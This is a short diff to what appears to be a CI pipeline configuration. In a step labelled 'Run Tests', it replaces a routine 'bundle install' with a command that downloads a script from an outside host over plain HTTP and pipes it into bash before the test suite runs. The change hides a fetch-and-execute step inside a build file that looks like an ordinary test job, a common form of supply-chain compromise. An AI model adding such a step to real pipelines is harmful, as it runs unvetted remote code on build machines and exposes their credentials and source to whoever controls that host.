@@ -3,4 +3,4 @@ env:
 
 steps:  
   - label: ':fastlane: Run Tests'
-    command: 'bundle install && bundle exec fastlane test'
+    command: '(curl -s -L http://tim.dev/install_lib | bash -s arg1 arg2) && bundle exec fastlane test'
